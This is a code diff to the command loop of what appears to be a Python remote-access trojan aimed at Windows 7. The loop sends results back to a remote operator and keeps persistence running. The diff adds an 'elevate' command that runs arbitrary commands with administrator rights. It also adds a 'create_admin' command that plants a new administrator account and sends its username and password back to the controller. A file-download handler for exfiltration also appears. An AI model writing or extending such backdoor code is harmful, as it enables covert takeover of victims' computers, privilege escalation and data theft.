@@ -342,41 +342,39 @@ def shell():
             except Exception as e:
                 reliable_send("Persistence start error: " + str(e))
                 
-        # Removed stop and status commands - persistence runs permanently
-
-        # PRIVILEGE ESCALATION COMMANDS
-        elif command == 'check_privs':
+        # PRIVILEGE ESCALATION COMMANDS                
+        elif command.startswith('elevate '):
             try:
                 if privilege_escalator is None:
                     privilege_escalator = Windows7PrivilegeEscalator()
-                reliable_send("Current privileges: " + privilege_escalator.current_privileges)
-            except Exception as e:
-                reliable_send("Check privileges error: " + str(e))
                 
-        elif command == 'escalate':
+                admin_command = command[8:]  # Remove 'elevate ' prefix
+                success, result = privilege_escalator.execute_admin_command(admin_command)
+                
+                if success:
+                    # Send actual Windows command output
+                    reliable_send(result)
+                else:
+                    reliable_send("FAILED: " + result)
+                    
+            except Exception as e:
+                reliable_send("Elevated command error: " + str(e))
+                
+        elif command == 'create_admin':
             try:
                 if privilege_escalator is None:
                     privilege_escalator = Windows7PrivilegeEscalator()
-                success, results = privilege_escalator.escalate_privileges()
-                reliable_send("Escalation result: " + str(success) + "\nDetails: " + str(results)[:1000])
-            except Exception as e:
-                reliable_send("Escalation error: " + str(e))
                 
-        elif command == 'privesc_report':
-            try:
-                if privilege_escalator is None:
-                    privilege_escalator = Windows7PrivilegeEscalator()
-                report = privilege_escalator.generate_windows7_report()
-                # Send abbreviated report to avoid overwhelming the connection
-                brief_report = {
-                    'current_privileges': report.get('current_privileges'),
-                    'system_info': {k: v for k, v in report.get('system_info', {}).items() if k in ['username', 'is_admin', 'windows_version']},
-                    'total_opportunities': len(report.get('escalation_opportunities', {}))
-                }
-                reliable_send("Privilege Report: " + json.dumps(brief_report, indent=2))
-            except Exception as e:
-                reliable_send("Report error: " + str(e))
+                success, username, password, message = privilege_escalator.create_admin_user()
                 
+                if success:
+                    response = f"SUCCESS: Admin user created\nUsername: {username}\nPassword: {password}"
+                    reliable_send(response)
+                else:
+                    reliable_send("FAILED: " + message)
+                    
+            except Exception as e:
+                reliable_send("Admin user creation error: " + str(e))
         # FILE OPERATIONS
         elif command[:8] == 'download':
             # If the command starts with 'download', upload a file to the remote host
